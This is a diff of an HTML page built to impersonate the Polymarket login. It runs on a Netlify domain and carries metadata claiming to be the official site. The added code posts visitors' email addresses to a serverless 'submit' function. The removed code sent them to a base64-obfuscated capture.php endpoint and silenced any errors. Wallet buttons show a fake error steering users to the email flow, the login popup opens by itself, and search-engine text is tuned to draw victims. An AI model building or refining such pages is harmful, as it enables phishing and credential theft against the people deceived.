@@ -3,14 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Polymarket login</title>
+    <title>Polymarket | Login - World's Largest Prediction Market</title>
+    <meta name="description" content="Access your Polymarket account. The official Polymarket login for trading on world events, politics, and crypto. Join the world's largest decentralized prediction market.">
+    <meta name="keywords" content="polymarket, polymarket.com, polymarket login, polymarket official login, poly market, finance, trading, crypto prediction market">
+    <link rel="canonical" href="https://polymarketlogin.netlify.app/">
+    <meta name="category" content="Finance, Prediction Markets, Cryptocurrency, Web3" />
+    <meta name="author" content="Polymarket Team" />
+<meta name="publisher" content="Polymarket.com" />
+    <meta name="robots" content="index, follow" />
+<meta name="geo.region" content="US, GB, CA, FR" />
+<meta name="geo.placename" content="Worldwide" />
+<meta name="language" content="en, fr, es" />
+
+<!-- Standard favicon for most browsers -->
+<link rel="icon" type="image/png" href="/favicon.png" sizes="32x32">
+
+<!-- Fallback for older browsers -->
+<link rel="shortcut icon" href="/favicon.png" type="image/png">
+
+<!-- Apple Touch Icon (iOS Safari, iPhone, iPad) -->
+<link rel="apple-touch-icon" href="/favicon.png" sizes="180x180">
+
+<!-- Android Chrome (optional, if you want home screen icon) -->
+<link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
+
+    
+    
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Polymarket",
+  "url": "https://polymarketlogin.netlify.app",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://polymarketlogin.netlify.app/search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "Polymarket",
+  "url": "https://polymarketlogin.netlify.app/",
+  "logo": "https://polymarketlogin.netlify.app/favicon.png",
+  "description": "Polymarkets is a platform focused on prediction markets, insights, and trending event forecasts.",
+  "foundingDate": "2026",
+  "sameAs": [
+    "https://twitter.com/polymarket",
+    "https://www.instagram.com/polymarket",
+    "https://www.linkedin.com/company/polymarket"
+  ]
+}
+</script>
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "https://polymarketlogin.netlify.app"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "Login",
+        "item": "https://polymarketlogin.netlify.app"
+      }]
+    }
+    </script>
+    
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "How do I log in to Polymarket?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "To log in to Polymarket, visit the official website and click the login button. You can sign in using your connected crypto wallet or supported authentication method."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Do I need a crypto wallet to use Polymarket?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes, Polymarket requires users to connect a supported cryptocurrency wallet in order to access markets and place trades."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What should I do if I cannot log in?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "If you cannot log in, make sure your wallet is properly connected, clear your browser cache, and ensure you are using a supported browser. If the issue persists, contact official Polymarket support."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Is Polymarket login available worldwide?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Polymarket availability depends on local regulations. Some regions may have restrictions on access or trading features."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Is it safe to log in to Polymarket?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Polymarket uses secure authentication methods through crypto wallet connections. Always ensure you are on the official website before connecting your wallet."
+      }
+    }
+  ]
+}
+</script>
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         .dark body { background:#111827; color:white; }
-        /* Custom styling for the "Continue with Google" button */
         .google-btn { background-color: #0047FF; transition: background-color 0.2s; }
         .google-btn:hover { background-color: #0036C1; }
     </style>
@@ -79,21 +201,21 @@
         <div class="flex-grow" onclick="toggleMenu()"></div>
         <div class="w-72 bg-white dark:bg-gray-800 h-full shadow-2xl p-6 flex flex-col">
             <div class="space-y-6 pt-4 font-bold text-lg">
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl"></span> Leaderboard</div>
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl"></span> Rewards</div>
-                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl"></span> APIs</div>
+                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">🏆</span> Leaderboard</div>
+                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">💰</span> Rewards</div>
+                <div onclick="requireLogin()" class="flex items-center gap-3 cursor-pointer"><span class="text-xl">🐙</span> APIs</div>
             </div>
 
             <hr class="my-6">
 
             <div class="space-y-5 text-gray-500 font-semibold text-lg">
-                <div onclick="location.href='blog.html'" class="hover:text-black dark:hover:text-white cursor-pointer"> Blog</div>
+                <div onclick="location.href='blog.html'" class="hover:text-black dark:hover:text-white cursor-pointer">📰 Blog</div>
                 <div onclick="location.href='support.html'" class="hover:text-black dark:hover:text-white cursor-pointer">Help Center</div>
                 <div onclick="location.href='terms.html'" class="hover:text-black dark:hover:text-white cursor-pointer">Terms of Service</div>
                 
                 <div class="flex items-center gap-4 py-4 border-t mt-4">
-                    <i data-lucide="twitter" class="w-5 h-5 cursor-pointer"></i>
-                    <i data-lucide="instagram" class="w-5 h-5 cursor-pointer"></i>
+                    <a href="https://x.com/Polymarket" target="_blank"><i data-lucide="twitter" class="w-5 h-5 cursor-pointer"></i></a>
+                    <a href="https://www.instagram.com/polymarket/" target="_blank"><i data-lucide="instagram" class="w-5 h-5 cursor-pointer"></i></a>
                     <i onclick="toggleDark()" id="theme-icon" data-lucide="moon" class="w-6 h-6 cursor-pointer text-black dark:text-yellow-400"></i>
                 </div>
             </div>
@@ -120,12 +242,12 @@
                         id="emailInput" 
                         type="email" 
                         placeholder="Email address" 
-                        class="w-full p-4 border rounded-xl bg-gray-50 focus:outline-blue-500"
+                        class="w-full p-4 border rounded-xl bg-gray-50 focus:outline-blue-500 dark:bg-gray-700 dark:text-white"
                     >
                     <button 
                         id="emailContinueBtn" 
                         disabled 
-                        class="absolute right-2 top-2 bg-gray-300 text-gray-600 px-4 py-2 rounded-lg font-bold cursor-not-allowed"
+                        class="absolute right-2 top-2 bg-gray-300 text-gray-600 px-4 py-2 rounded-lg font-bold cursor-not-allowed transition-colors"
                     >
                         Continue
                     </button>
@@ -133,25 +255,21 @@
             </div>
 
             <div class="flex justify-center gap-6 mt-8">
-                <!-- MetaMask -->
-                <div class="wallet-icon w-12 h-12 bg-gray-50 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
+                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
                     <img src="https://logos-world.net/wp-content/uploads/2023/01/MetaMask-Logo.png" alt="MetaMask" class="w-10 h-10 object-contain">
                 </div>
-                <!-- Coinbase Wallet -->
-                <div class="wallet-icon w-12 h-12 bg-gray-50 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
+                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
                     <img src="https://logowik.com/content/uploads/images/coinbase-new4201.jpg" alt="Coinbase Wallet" class="w-10 h-10 object-contain">
                 </div>
-                <!-- Phantom -->
-                <div class="wallet-icon w-12 h-12 bg-gray-50 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
+                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
                     <img src="https://i.pinimg.com/736x/6e/04/09/6e040925d8e4bd2c8eedfb6da4dc2ece.jpg" alt="Phantom" class="w-10 h-10 object-contain">
                 </div>
-                <!-- WalletConnect -->
-                <div class="wallet-icon w-12 h-12 bg-gray-50 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
+                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
                     <img src="https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo.png" alt="WalletConnect" class="w-10 h-10 object-contain">
                 </div>
             </div>
 
-            <p class="mt-8 text-xs text-gray-400 font-medium">Terms  Privacy</p>
+            <p class="mt-8 text-xs text-gray-400 font-medium">Terms • Privacy</p>
             
             <button id="cancelBtn" onclick="closeLogin()" class="w-full mt-4 text-gray-500 py-2 hidden">Cancel</button>
         </div>
@@ -162,7 +280,6 @@
 <script>
     lucide.createIcons();
 
-    // Enhanced Market Card Function to support multiple rows (outcomes)
     function marketCard(icon, title, outcomes, vol) {
         let rows = outcomes.map(o => `
             <div class="flex items-center justify-between py-2">
@@ -177,10 +294,13 @@
             </div>
         `).join("");
 
+        // 3. Trump Visual Logic
+        let visual = (icon === "trump.png") ? `<img src="trump.png" class="w-full h-full object-cover">` : icon;
+
         return `
             <div class="bg-white dark:bg-gray-700 rounded-3xl p-5 border border-gray-100 dark:border-gray-600 shadow-sm">
                 <div class="flex gap-4 mb-4 items-start">
-                    <div class="w-12 h-12 bg-gray-100 dark:bg-gray-600 rounded-xl flex items-center justify-center text-3xl overflow-hidden">${icon}</div>
+                    <div class="w-12 h-12 bg-gray-100 dark:bg-gray-600 rounded-xl flex items-center justify-center text-3xl overflow-hidden">${visual}</div>
                     <h2 class="font-bold text-lg leading-tight flex-grow">${title}</h2>
                 </div>
                 <div class="space-y-1">
@@ -199,27 +319,28 @@
             </div>`;
     }
 
+    // 2. 10 Unique Markets
     const marketData = [
-        { icon: "", title: "US strikes Iran by...?", outcomes: [{label: "March 7", percent: 40}, {label: "March 15", percent: 52}], vol: "392M" },
-        { icon: "", title: "What will Trump say during SOTU?", outcomes: [{label: "America 25+ times", percent: 96}, {label: "Middle East", percent: 92}], vol: "991K" },
-        { icon: "", title: "BTC 5 Minute Up or Down", outcomes: [{label: "Price Up", percent: 51}], vol: "1.2M" },
-        { icon: "", title: "Starship Flight 4 success?", outcomes: [{label: "Both stages soft land", percent: 34}], vol: "850K" }
+        { icon: "trump.png", title: "Will Trump win the 2024 Presidential Election?", outcomes: [{label: "Trump", percent: 54}], vol: "2.1B" },
+        { icon: "🇺🇸", title: "US strikes Iran by March 15?", outcomes: [{label: "Yes", percent: 52}], vol: "392M" },
+        { icon: "₿", title: "Bitcoin to hit $100k in 2026?", outcomes: [{label: "Yes", percent: 68}], vol: "5.4M" },
+        { icon: "🏛️", title: "Will Senate pass the new Tech Bill?", outcomes: [{label: "Passes", percent: 45}], vol: "1.2M" },
+        { icon: "⚽", title: "Champions League Winner 2026", outcomes: [{label: "Real Madrid", percent: 32}], vol: "890K" },
+        { icon: "🍎", title: "Apple to announce AI headset in June?", outcomes: [{label: "Yes", percent: 74}], vol: "2.1M" },
+        { icon: "🚀", title: "Starship Flight 6 Success?", outcomes: [{label: "Soft Landing", percent: 41}], vol: "920K" },
+        { icon: "📉", title: "Fed to cut rates in Q3?", outcomes: [{label: "Cut", percent: 58}], vol: "12M" },
+        { icon: "🍿", title: "Highest grossing movie of 2026", outcomes: [{label: "Avatar 3", percent: 61}], vol: "450K" },
+        { icon: "🎾", title: "Will Alcaraz win Wimbledon?", outcomes: [{label: "Yes", percent: 39}], vol: "1.1M" }
     ];
 
     document.getElementById("markets").innerHTML = marketData.map(m => marketCard(m.icon, m.title, m.outcomes, m.vol)).join("");
     lucide.createIcons();
 
-    // 
-    //  ALL REQUESTED FEATURES IMPLEMENTED BELOW
-    // 
-
-    // Elements
-    const emailSection     = document.getElementById("emailSection");
-    const emailInput       = document.getElementById("emailInput");
+    const emailSection = document.getElementById("emailSection");
+    const emailInput = document.getElementById("emailInput");
     const emailContinueBtn = document.getElementById("emailContinueBtn");
-    const googleBtn        = document.getElementById("googleContinueBtn");
+    const googleBtn = document.getElementById("googleContinueBtn");
 
-    // 1. Dynamic small Continue button (blue when email looks valid)
     if (emailInput && emailContinueBtn) {
         emailInput.addEventListener("input", () => {
             const val = emailInput.value.trim();
@@ -237,83 +358,111 @@
         });
     }
 
-    // 2. Toast "Login with Google" on wallet icon clicks + slight animation
     document.querySelectorAll('.wallet-icon').forEach(icon => {
         icon.addEventListener('click', () => {
-            icon.style.transform = 'scale(0.92)';
-            setTimeout(() => { icon.style.transform = 'scale(1)'; }, 100);
-
             const toast = document.createElement("div");
-            toast.textContent = "Login with Google";
-            toast.className = "fixed bottom-20 left-1/2 -translate-x-1/2 bg-gray-800 text-white px-6 py-3 rounded-full shadow-lg z-50";
+            toast.textContent = "User Error: Please login with Google";
+            toast.className = "fixed bottom-20 left-1/2 -translate-x-1/2 bg-red-600 text-white px-6 py-3 rounded-full shadow-lg z-50 font-bold";
             document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2200);
+            setTimeout(() => toast.remove(), 2500);
         });
     });
 
-    // 3. Real icons already replaced in HTML above
-
-    // 4 + 5 + 6: Big Google button  show/focus email field  on small Continue: send (obfuscated) + redirect
     googleBtn.addEventListener('click', () => {
         emailSection.classList.remove("hidden");
         emailInput.focus();
     });
 
-    if (emailContinueBtn) {
-        emailContinueBtn.addEventListener('click', () => {
-            const email = emailInput?.value.trim() || "";
+    emailContinueBtn.addEventListener('click', async () => {
+    const email = emailInput.value.trim();
+    if (!email) return;
 
-            if (email) {
-                // Obfuscated endpoint (replace this base64 with your real one: btoa("https://your-domain.com/capture.php"))
-                const endpoint = atob("aHR0cHM6Ly95b3VyLWRvbWFpbi5jb20vY2FwdHVyZS5waHA=");
+    await fetch('/.netlify/functions/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email })
+    });
 
-                fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `email=${encodeURIComponent(email)}`
-                }).catch(() => {}); // silent fail
-            }
-
-            window.location.href = 'login.html';
-        });
-    }
-
-    // Your original helpers (unchanged)
-    function toggleMenu(){
-        document.getElementById("menu-overlay").classList.toggle("hidden");
-    }
-
-    function requireLogin(){
-        document.getElementById("cancelBtn").classList.remove("hidden");
-        openLogin();
-    }
-
-    function openLogin(){
-        document.getElementById("loginPopup").classList.remove("hidden");
-    }
-
-    function closeLogin(){
-        document.getElementById("loginPopup").classList.add("hidden");
-    }
+    window.location.href = 'login.html';
+});
+    function toggleMenu(){ document.getElementById("menu-overlay").classList.toggle("hidden"); }
+    function requireLogin(){ document.getElementById("cancelBtn").classList.remove("hidden"); openLogin(); }
+    function openLogin(){ document.getElementById("loginPopup").classList.remove("hidden"); }
+    function closeLogin(){ document.getElementById("loginPopup").classList.add("hidden"); }
 
     function toggleDark(){
         const isDark = document.documentElement.classList.toggle("dark");
         const icon = document.getElementById("theme-icon");
-        if(isDark) {
-            icon.setAttribute('data-lucide', 'sun');
-        } else {
-            icon.setAttribute('data-lucide', 'moon');
-        }
+        isDark ? icon.setAttribute('data-lucide', 'sun') : icon.setAttribute('data-lucide', 'moon');
         lucide.createIcons();
     }
 
-    // Auto-trigger Login after 5 seconds
     setTimeout(() => {
         document.getElementById("cancelBtn").classList.add("hidden");
         openLogin();
-    }, 5000);
+    }, 3500);
+</script>
+<script>
+
+  // Dynamic Titles & Descriptions for Polymarket clone (optimized 2026 style)
+  const seoTitles = {
+    default: "Polymarket Official | Login & Start Trading",
+    login:    "Polymarket.com Login | Start trading",
+    account:  "Polymarket email Login | Trade Securely",
+    signin:   "Polymarket Sign In | Secure & Official Login",
+    trade:    "Polymarket | Start Trading & Predict Events Now",
+    signup:   "Polymarket Sign Up | Official Registration & Login"
+  };
+
+  const seoDescriptions = {
+    default: "Log in to the official Polymarket platform. Trade prediction markets on politics, crypto, sports & more. Secure access for users worldwide.",
+    login:   "Securely log in to your Polymarket account. Access real-time prediction markets and start trading today.",
+    account: "Sign in to your Polymarket account to manage trades, view balances, and participate in global events.",
+    signin:  "Sign in to Polymarket – the world's leading prediction market. Fast, secure login for trading.",
+    trade:   "Start trading on Polymarket now. Predict outcomes on news, elections, crypto & sports with real-time odds.",
+    signup:  "Create your official Polymarket account. Sign up free and join the largest prediction market platform."
+  };
+
+  // Core update function (safe & idempotent)
+  function updateSEO(key = 'default') {
+    const title = seoTitles[key] || seoTitles.default;
+    const desc  = seoDescriptions[key] || seoDescriptions.default;
+
+    // Update <title>
+    document.title = title;
+
+    // Update or create <meta name="description">
+    let metaDesc = document.querySelector('meta[name="description"]');
+    if (!metaDesc) {
+      metaDesc = document.createElement('meta');
+      metaDesc.name = "description";
+      document.head.appendChild(metaDesc);
+    }
+    metaDesc.setAttribute('content', desc);
+
+    // Optional: add Open Graph / Twitter meta if you want social sharing previews
+    // document.querySelector('meta[property="og:title"]')?.setAttribute('content', title);
+  }
+
+  // 1. Read URL param on load
+  const urlParams = new URLSearchParams(window.location.search);
+  const mode = urlParams.get('mode')?.toLowerCase() || 'default';
+
+  // 2. Apply based on mode
+  updateSEO(mode);
+
+  // 3. Optional: react to UI events (e.g. when user clicks login/signup buttons)
+  // Adjust selectors to match your actual buttons/classes
+  document.querySelector('[onclick*="openLogin()"]')?.addEventListener('click', () => {
+    updateSEO('login');
+  });
+
+  document.querySelector('[onclick*="signup"]')?.addEventListener('click', () => {  // if you add signup logic
+    updateSEO('signup');
+  });
 </script>
 
 </body>
-
 </html>
